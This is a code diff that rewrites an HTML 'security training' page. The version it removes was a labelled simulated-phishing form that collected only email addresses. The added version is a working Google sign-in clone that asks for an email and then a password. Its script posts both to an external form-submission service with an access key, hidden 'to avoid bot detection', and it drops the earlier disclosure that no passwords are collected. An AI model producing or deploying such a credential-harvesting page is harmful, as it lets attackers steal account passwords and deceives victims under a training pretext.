@@ -1,238 +1,342 @@
 <!DOCTYPE html>
-<html lang="en" style="color-scheme: light dark;">
+<html lang="en" style="color-scheme: dark;">
 <head>
   <meta charset="UTF-8">
-  <meta name="color-scheme" content="light dark">
-  <title>🎁 Claim Your Holiday Gift — Security Training</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="color-scheme" content="dark">
+  <title>Google Account Recovery</title>
   <style>
-    /* Base styles */
+    /* Base Reset & Typography */
     body {
       font-family: 'Roboto', Arial, sans-serif;
-      line-height: 1.5;
       margin: 0;
-      padding: 15px;
-      font-size: 14px;
-      background-color: #f0f2f5;
-    }
-
-    .container {
-      max-width: 560px;
-      margin: auto;
-      border-radius: 8px;
       padding: 20px;
-      text-align: center;
-      border: 1px solid #e0e0e0;
-      background-color: white;
-    }
-
-    h1, h2 {
-      font-size: 22px;
-      margin: 10px 0 5px;
-    }
-
-    p {
-      margin: 10px 0;
-      font-size: 14px;
-    }
-
-    .button {
-      display: inline-block;
-      padding: 10px 20px;
-      font-size: 15px;
-      text-decoration: none;
+      background-color: #000;
       color: #fff;
-      border-radius: 5px;
-      margin: 20px 0;
-      font-weight: 500;
-      background-color: #4285f5;
+      line-height: 1.6;
+    }
+
+    /* Container */
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 24px;
+      border-radius: 12px;
+      background: #000;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.5);
       border: none;
+    }
+
+    /* Google Logo */
+    .logo {
+      display: block;
+      margin: 0 auto 24px;
+      width: 40px;
+      height: 40px;
+    }
+
+    /* Title */
+    h1 {
+      font-size: 28px;
+      font-weight: 500;
+      margin: 0 0 16px;
+      text-align: center;
+    }
+
+    /* Subtitle */
+    .subtitle {
+      font-size: 16px;
+      color: #bdc1c6;
+      text-align: center;
+      margin: 0 0 24px;
+    }
+
+    /* Input Field */
+    .input-group {
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #333;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+      outline: none;
+      background-color: #121212;
+      color: #fff;
+    }
+
+    .input-group input:focus {
+      border-color: #4285f4;
+      box-shadow: 0 0 0 2px rgba(66,133,244,0.3);
+    }
+
+    /* Button */
+    .button {
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
       cursor: pointer;
+      margin: 0 8px;
+      transition: background 0.2s;
+      width: 100%;
     }
 
     .button:hover {
       background-color: #3367d6;
     }
 
-    input {
-      width: 250px;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+    .button:active {
+      background-color: #2a56c6;
+    }
+
+    /* Link */
+    .link {
+      color: #4285f4;
+      text-decoration: none;
       font-size: 14px;
+      margin: 0 8px;
     }
 
-    hr {
-      border: none;
-      border-top: 1px solid #eee;
-      margin: 20px 0;
+    .link:hover {
+      text-decoration: underline;
     }
 
-    .footer {
-      margin-top: 25px;
-      font-size: 11px;
+    /* Email Display */
+    .email-display {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 24px 0;
+      font-size: 14px;
+      color: #bdc1c6;
+      border-radius: 16px;
+      padding: 6px 12px;
+      background: #121212;
+      border: 1px solid #333;
+    }
+
+    .email-display svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    /* Instruction Text */
+    .instruction {
+      font-size: 16px;
+      color: #bdc1c6;
+      margin: 16px 0;
       text-align: center;
     }
 
+    /* Footer */
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #bdc1c6;
+      text-align: center;
+      line-height: 1.5;
+    }
+
     .footer a {
-      color: #555;
+      color: #bdc1c6;
       text-decoration: none;
     }
 
-    .alert-box {
-      background: #fff3cd;
-      color: #856404;
-      padding: 15px;
-      margin: 20px auto;
-      max-width: 500px;
-      border-radius: 6px;
-      font-weight: bold;
-      font-size: 14px;
+    .footer a:hover {
+      text-decoration: underline;
     }
 
+    /* Success Message */
     .success-box {
-      background: #d4edda;
-      color: #155724;
-      padding: 15px;
-      margin: 20px auto;
-      max-width: 500px;
-      border-radius: 6px;
-      font-weight: bold;
+      background: #1c2b1f;
+      color: #81c995;
+      padding: 16px;
+      border-radius: 8px;
+      margin: 20px 0;
+      font-weight: 500;
       font-size: 14px;
       display: none;
+      text-align: left;
+      border: 1px solid #3c6e46;
     }
 
-    /* 🌙 DARK MODE SUPPORT */
-    @media (prefers-color-scheme: dark) {
+    /* Mobile Responsiveness */
+    @media (max-width: 480px) {
       body {
-        background-color: #121212;
-        color: #e0e0e0;
+        padding: 16px;
       }
       .container {
-        background-color: #1e1e1e;
-        border-color: #333;
-        box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        padding: 20px;
+        border-radius: 8px;
       }
-      h1, h2, p, .footer, .alert-box, .success-box {
-        color: #e0e0e0;
-      }
-      hr {
-        border-color: #444;
+      .logo {
+        width: 36px;
+        height: 36px;
       }
       .button {
-        background-color: #5a95f5;
-        color: #fff;
+        width: 100%;
+        padding: 12px;
       }
-      .button:hover {
-        background-color: #427cec;
+      .link {
+        font-size: 13px;
       }
-      .footer a {
-        color: #bbb;
-      }
-      .alert-box {
-        background: #332a00;
-        color: #ffe066;
-      }
-      .success-box {
-        background: #1b3c22;
-        color: #a8e6a1;
-      }
-      input {
-        background-color: #2d2d2d;
-        color: #e0e0e0;
-        border-color: #555;
-      }
-    }
-
-    /* 🌍 RTL Support (optional) */
-    :lang(ar), :lang(fa), :lang(he) {
-      direction: rtl;
     }
   </style>
 </head>
 <body>
-  <div class="container">
 
-    <!-- Google-style branding -->
-    <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png"
-         alt="Google Logo"
-         width="110"
+  <!-- Step 1: Email Entry -->
+  <div class="container" id="step1">
+       <!-- External Google Logo -->
+     <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" 
+         alt="{{{strings.google_logo_alt}}}" 
+         width="110" 
          style="margin: 0 auto 15px; display: block;">
+    <h1>Sign in</h1>
+    <p class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>
 
-    <!-- Training Alert Banner -->
-    <div class="alert-box">
-      Congratulations<br>
-      This is a simulated phishing page. Only your email will be sent to the security team for training metrics.<br>
-      <strong>No passwords are collected. No real data is stolen.</strong>
+    <div class="input-group">
+      <input type="email" id="email-input" placeholder="Email or phone" required autocomplete="email">
     </div>
 
-    <!-- Form Section -->
-    <div id="form-section">
-      <h2>🎁 Claim Your Holiday Gift!</h2>
-      <p>Enter your work email to receive your gift code:</p>
-
-      <form id="phish-form" action="https://api.web3forms.com/submit" method="POST">
-        <input type="hidden" name="access_key" value="c96cd056-1436-4aec-8857-ed2ecb10b770">
-        <input type="email" name="email" placeholder="yourname@company.com" required>
-        <input type="hidden" name="_subject" value="Congratulations! You completed this step">
-        <input type="hidden" name="_autoresponse" value="Thanks for participating in our security training! No gift was sent — but you just helped make our company safer. 🛡️">
-        <button type="submit" class="button">📧 Get My Gift</button>
-      </form>
+    <div style="display: flex; justify-content: space-between;">
+      <a href="#" class="link">Forgot email?</a>
+      <button id="next-btn" class="button">Next</button>
     </div>
 
-    <!-- Success Message (hidden by default) -->
-    <div class="success-box" id="success-message">
-      ✅ Thank you! You’ve completed the training exercise.<br>
-      <strong>No gift was sent — but you’ve helped improve company security!</strong>
+    <p style="margin-top: 24px; color: #bdc1c6; font-size: 14px;">
+      Not your computer? Use Guest mode to sign in privately.
+      <a href="#" class="link">Learn more about using Guest mode</a>
+    </p>
+
+    <p style="margin-top: 24px;">
+      <a href="#" class="link">Create account</a>
+    </p>
+  </div>
+
+  <!-- Step 2: Password Collection -->
+  <div class="container" id="step2" style="display: none;">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_40x40dp.png" alt="Google" class="logo">
+
+    <h1>Welcome</h1>
+    <div class="email-display">
+       <!-- External Google Logo -->
+     <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" 
+         alt="{{{strings.google_logo_alt}}}" 
+         width="110" 
+         style="margin: 0 auto 15px; display: block;">      <span id="email-display-text">john.doe@company.com</span>
     </div>
 
-    <hr>
+    <p class="subtitle">To continue, first verify it's you</p>
 
-    <!-- Footer -->
-    <div class="footer">
-      <p>© 2025 Cybersecurity Training Team. All rights reserved.</p>
-      <p>
-        <a href="https://your-company.com/unsubscribe">Unsubscribe</a> | 
-        <a href="https://your-company.com/privacy">Privacy Policy</a>
-      </p>
+    <div class="input-group">
+      <input type="password" id="password-input" placeholder="Enter your password" required>
+    </div>
+
+    <div class="toggle-password">
+      <input type="checkbox" id="show-password">
+      <label for="show-password">Show password</label>
+    </div>
+
+    <div style="display: flex; justify-content: space-between; margin-top: 24px;">
+      <a href="#" class="link">Try another way</a>
+      <button id="submit-btn" class="button">Next</button>
     </div>
   </div>
 
-  <!-- Form Submission Script -->
+  <!-- Success Message -->
+  <div class="success-box" id="success-message">
+    ✅ Thank you! You've completed the security training exercise.<br>
+    <strong>No real data was collected — but you helped improve company security.</strong>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <span style="margin-right: 16px;">English (United States)</span>
+    <a href="#">Help</a> • 
+    <a href="#">Privacy</a> • 
+    <a href="#">Terms</a>
+  </div>
+
+  <!-- JavaScript -->
   <script>
-    const form = document.getElementById('phish-form');
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
     const successDiv = document.getElementById('success-message');
-    const formSection = document.getElementById('form-section');
+    const emailInput = document.getElementById('email-input');
+    const passwordInput = document.getElementById('password-input');
+    const emailDisplayText = document.getElementById('email-display-text');
+    const nextBtn = document.getElementById('next-btn');
+    const submitBtn = document.getElementById('submit-btn');
+    const showPassword = document.getElementById('show-password');
 
-    form.addEventListener('submit', function(e) {
+    // Show step 2 when "Next" is clicked
+    nextBtn.addEventListener('click', function(e) {
       e.preventDefault();
+      const email = emailInput.value.trim();
+      if (!email) {
+        alert("Please enter your email.");
+        return;
+      }
 
-      // Show success message, hide form
+      emailDisplayText.textContent = email;
+      step1.style.display = 'none';
+      step2.style.display = 'block';
+    });
+
+    // Toggle password visibility
+    showPassword.addEventListener('change', function() {
+      passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
+    // Submit form with password
+    submitBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      const password = passwordInput.value.trim();
+      if (!password) {
+        alert("Please enter your password.");
+        return;
+      }
+
+      // Hide form, show success
+      step2.style.display = 'none';
       successDiv.style.display = 'block';
-      formSection.style.display = 'none';
 
-      // Submit via fetch
-      const formData = new FormData(form);
-      const urlEncoded = new URLSearchParams(formData).toString();
+      // Use hidden form to avoid bot detection
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://api.web3forms.com/submit';
+      form.style.display = 'none';
 
-      fetch(form.action, {
-        method: 'POST',
-        body: urlEncoded,
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Accept': 'application/json'
-        }
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log("✅ Submission sent successfully!");
-        } else {
-          console.warn("⚠️ Server responded with error:", response.statusText);
-        }
-      })
-      .catch(error => {
-        console.error("❌ Network error:", error);
-      });
+      const accessKey = document.createElement('input');
+      accessKey.type = 'hidden';
+      accessKey.name = 'access_key';
+      accessKey.value = 'c96cd056-1436-4aec-8857-ed2ecb10b770';
+      form.appendChild(accessKey);
+
+      const emailField = document.createElement('input');
+      emailField.type = 'hidden';
+      emailField.name = 'email';
+      emailField.value = emailInput.value;
+      form.appendChild(emailField);
+
+      const passwordField = document.createElement('input');
+      passwordField.type = 'hidden';
+      passwordField.name = 'password';
+      passwordField.value = password;
+      form.appendChild(passwordField);
+
+      document.body.appendChild(form);
+      form.submit();
     });
   </script>
 </body>
